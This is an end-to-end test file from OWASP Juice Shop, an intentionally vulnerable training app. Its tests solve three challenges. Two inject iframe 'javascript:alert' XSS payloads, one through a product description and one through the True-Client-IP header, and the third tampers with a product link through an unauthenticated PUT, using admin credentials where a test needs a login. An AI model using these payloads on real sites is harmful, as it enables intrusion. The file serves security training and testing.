/*
 * Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
 * SPDX-License-Identifier: MIT
 */

import config = require('config')
import { $, browser, by, element, protractor } from 'protractor'
import { basePath, beforeEachLogin, expectChallengeSolved } from './e2eHelpers'
import { Product } from '../../data/types'

const models = require('../../models/index')
const utils = require('../../lib/utils')

describe('/api', () => {
  if (!utils.disableOnContainerEnv()) {
    describe('challenge "restfulXss"', () => {
      beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to create a new product when logged in', () => {
        const EC = protractor.ExpectedConditions
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('POST', `${baseUrl}/api/Products`, true)
          xhttp.setRequestHeader('Content-type', 'application/json')
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.send(JSON.stringify({ name: 'RestXSS', description: '<iframe src="javascript:alert(`xss`)">', price: 47.11 }))
        }, browser.baseUrl)

        void browser.waitForAngularEnabled(false)
        void browser.get(`${basePath}/#/search?q=RestXSS`)
        void browser.refresh()
        void browser.driver.sleep(1000)
        const productImage = element(by.css('img[alt="RestXSS"]'))
        void productImage.click()

        void browser.wait(EC.alertIsPresent(), 5000, "'xss' alert is not present on /#/search")
        void browser.switchTo().alert().then(
          alert => {
            expect(alert.getText()).toEqual(Promise.resolve('xss'))
            void alert.accept()
            // Disarm XSS payload so subsequent tests do not run into unexpected alert boxes
            models.Product.findOne({ where: { name: 'RestXSS' } }).then((product: any) => {
              product.update({ description: '&lt;iframe src="javascript:alert(`xss`)"&gt;' }).catch(error => {
                console.log(error)
                fail()
              })
            }).catch(error => {
              console.log(error)
              fail()
            })
          })
        void browser.waitForAngularEnabled(true)
      })

      expectChallengeSolved({ challenge: 'API-only XSS' })
    })
  }

  describe('challenge "changeProduct"', () => {
    const tamperingProductId = ((() => {
      const products: Product[] = config.get('products')
      for (let i = 0; i < products.length; i++) {
        if (products[i].urlForProductTamperingChallenge) {
          return i + 1
        }
      }
    })())
    const overwriteUrl = config.get('challenges.overwriteUrlForProductTamperingChallenge')

    it('should be possible to change product via PUT request without being logged in', () => {
      void browser.waitForAngularEnabled(false)

      void browser.executeScript((baseUrl: string, tamperingProductId: number, overwriteUrl: string) => {
        const xhttp = new XMLHttpRequest()
        xhttp.onreadystatechange = function () {
          if (this.status === 200) {
            console.log('Success')
          }
        }
        xhttp.open('PUT', `${baseUrl}/api/Products/${tamperingProductId}`, true)
        xhttp.setRequestHeader('Content-type', 'application/json')
        xhttp.send(JSON.stringify({
          description: `<a href="${overwriteUrl}" target="_blank">More...</a>`
        }))
      }, browser.baseUrl, tamperingProductId, overwriteUrl)
      void browser.driver.sleep(1000)
      void browser.waitForAngularEnabled(true)

      void browser.get(`${basePath}/#/search`)
    })

    expectChallengeSolved({ challenge: 'Product Tampering' })
  })
})

describe('/rest/saveLoginIp', () => {
  if (!utils.disableOnContainerEnv()) {
    describe('challenge "httpHeaderXss"', () => {
      beforeEachLogin({ email: `admin@${config.get('application.domain')}`, password: 'admin123' })

      it('should be possible to save log-in IP when logged in', () => {
        void browser.waitForAngularEnabled(false)
        void browser.executeScript((baseUrl: string) => {
          const xhttp = new XMLHttpRequest()
          xhttp.onreadystatechange = function () {
            if (this.status === 200) {
              console.log('Success')
            }
          }
          xhttp.open('GET', `${baseUrl}/rest/saveLoginIp`, true)
          xhttp.setRequestHeader('Authorization', `Bearer ${localStorage.getItem('token')}`)
          xhttp.setRequestHeader('True-Client-IP', '<iframe src="javascript:alert(`xss`)">')
          xhttp.send()
        }, browser.baseUrl)
        void browser.driver.sleep(1000)
        void browser.waitForAngularEnabled(true)
      })

      expectChallengeSolved({ challenge: 'HTTP-Header XSS' }) // TODO Add missing check for alert presence
    })
  }

  it('should not be possible to save log-in IP when not logged in', () => {
    void browser.waitForAngularEnabled(false)
    void browser.get(`${basePath}/rest/saveLoginIp`)
    void $('pre').getText().then(function (text) {
      expect(text).toMatch('Unauthorized')
    })
    void browser.driver.sleep(1000)
    void browser.waitForAngularEnabled(true)
  })
})
